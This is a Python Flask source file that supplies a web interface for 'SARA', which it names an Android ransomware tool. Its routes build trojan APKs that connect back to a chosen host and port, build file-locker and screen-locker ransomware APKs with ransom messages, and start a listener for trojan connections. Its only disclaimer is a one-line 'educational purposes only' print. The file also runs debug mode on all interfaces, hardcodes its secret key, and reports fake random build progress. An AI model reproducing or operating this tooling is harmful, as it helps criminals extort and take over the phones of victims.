#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SARA Web Interface
A Flask web application for SARA Android Ransomware Tool
"""

import os
import sys
import json
import time
import random
import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_file
from werkzeug.utils import secure_filename
from werkzeug.datastructures import FileStorage
import threading

# Import SARA core functions
sys.path.append('.')
from sara import (
    genertare_trojan, genertare_file_locker, genertare_screen_locker,
    start_trojan_listener, truncates, prints
)

app = Flask(__name__)
app.secret_key = 'sara_web_secret_key_2024'  # Change this in production
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Allowed file extensions for icons
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    """Main page with SARA options"""
    return render_template('index.html')

@app.route('/trojan')
def trojan():
    """Trojan builder page"""
    return render_template('trojan.html')

@app.route('/build_trojan', methods=['POST'])
def build_trojan():
    """Build custom trojan APK"""
    try:
        data = request.get_json()
        
        # Get form data with defaults
        name = data.get('name', 'trojan')
        host = data.get('host', '127.0.0.1')
        port = data.get('port', '4444')
        icon_path = data.get('icon', 'data/tmp/icon.png')
        
        # Validate inputs
        if not name:
            return jsonify({'error': 'App name is required'}), 400
        
        try:
            port = int(port)
            if port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            return jsonify({'error': 'Port must be a valid number between 1 and 65535'}), 400
        
        # Start trojan generation in background
        def generate_trojan():
            try:
                result_file = genertare_trojan(name, host, str(port), icon_path)
                # Store result in session or database for retrieval
                # For now, we'll just return success
                return result_file
            except Exception as e:
                print(f"Error generating trojan: {e}")
                return None
        
        # Run generation in background thread
        thread = threading.Thread(target=generate_trojan)
        thread.start()
        
        return jsonify({
            'success': True,
            'message': 'Trojan generation started. This may take several minutes.',
            'filename': f'{name.lower().replace(" ", "")}.apk'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/file_locker')
def file_locker():
    """File locker builder page"""
    return render_template('file_locker.html')

@app.route('/build_file_locker', methods=['POST'])
def build_file_locker():
    """Build custom file locker APK"""
    try:
        data = request.get_json()
        
        # Get form data with defaults
        name = data.get('name', 'File Locker')
        desc = data.get('desc', 'locked by sara@termuxhackers-id')
        icon_path = data.get('icon', 'data/tmp/icon.png')
        
        # Validate inputs
        if not name:
            return jsonify({'error': 'App name is required'}), 400
        
        # Start file locker generation in background
        def generate_file_locker():
            try:
                result_file = genertare_file_locker(name, desc, icon_path)
                return result_file
            except Exception as e:
                print(f"Error generating file locker: {e}")
                return None
        
        # Run generation in background thread
        thread = threading.Thread(target=generate_file_locker)
        thread.start()
        
        return jsonify({
            'success': True,
            'message': 'File locker generation started. This may take several minutes.',
            'filename': f'{name.lower().replace(" ", "")}.apk'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/screen_locker')
def screen_locker():
    """Screen locker builder page"""
    return render_template('screen_locker.html')

@app.route('/build_screen_locker', methods=['POST'])
def build_screen_locker():
    """Build custom screen locker APK"""
    try:
        data = request.get_json()
        
        # Get form data with defaults
        name = data.get('name', 'Screen Locker')
        head = data.get('head', 'Your Phone Is Locked')
        desc = data.get('desc', 'locked by sara@termuxhackers-id')
        keys = data.get('keys', 's3cr3t')
        icon_path = data.get('icon', 'data/tmp/icon.png')
        
        # Validate inputs
        if not name or not keys:
            return jsonify({'error': 'App name and passphrase are required'}), 400
        
        # Start screen locker generation in background
        def generate_screen_locker():
            try:
                result_file = genertare_screen_locker(name, head, desc, keys, icon_path)
                return result_file
            except Exception as e:
                print(f"Error generating screen locker: {e}")
                return None
        
        # Run generation in background thread
        thread = threading.Thread(target=generate_screen_locker)
        thread.start()
        
        return jsonify({
            'success': True,
            'message': 'Screen locker generation started. This may take several minutes.',
            'filename': f'{name.lower().replace(" ", "")}.apk',
            'passphrase': keys
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/listener')
def listener():
    """Trojan listener page"""
    return render_template('listener.html')

@app.route('/start_listener', methods=['POST'])
def start_listener():
    """Start trojan listener"""
    try:
        data = request.get_json()
        
        host = data.get('host', '127.0.0.1')
        port = data.get('port', '4444')
        
        try:
            port = int(port)
            if port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            return jsonify({'error': 'Port must be a valid number between 1 and 65535'}), 400
        
        # Start listener in background
        def start_listener_thread():
            try:
                start_trojan_listener(host, port)
            except Exception as e:
                print(f"Error starting listener: {e}")
        
        thread = threading.Thread(target=start_listener_thread)
        thread.daemon = True  # Daemon thread will exit when main program exits
        thread.start()
        
        return jsonify({
            'success': True,
            'message': f'Trojan listener started on {host}:{port}'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/upload_icon', methods=['POST'])
def upload_icon():
    """Upload custom icon file"""
    if 'icon' not in request.files:
        return jsonify({'error': 'No file selected'}), 400
    
    file = request.files['icon']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        # Add timestamp to avoid filename conflicts
        timestamp = str(int(time.time()))
        filename = f"{timestamp}_{filename}"
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        
        return jsonify({
            'success': True,
            'filename': filename,
            'path': file_path
        })
    
    return jsonify({'error': 'Invalid file type. Only PNG, JPG, JPEG, and GIF files are allowed.'}), 400

@app.route('/download/<filename>')
def download_file(filename):
    """Download generated APK file"""
    try:
        file_path = os.path.join('.', filename)
        if os.path.exists(file_path):
            return send_file(file_path, as_attachment=True)
        else:
            flash('File not found', 'error')
            return redirect(url_for('index'))
    except Exception as e:
        flash(f'Error downloading file: {str(e)}', 'error')
        return redirect(url_for('index'))

@app.route('/status/<task_type>')
def check_status(task_type):
    """Check build status (placeholder for now)"""
    # In a real implementation, you'd track build status in a database or cache
    return jsonify({
        'status': 'building',
        'progress': random.randint(10, 90),
        'message': 'Building APK... Please wait.'
    })

@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

if __name__ == '__main__':
    print("Starting SARA Web Interface...")
    print("⚠️  WARNING: This tool is for educational purposes only!")
    print("    The author is not responsible for any misuse.")
    print("🌐 Web interface will be available at: http://localhost:5000")
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000, debug=True)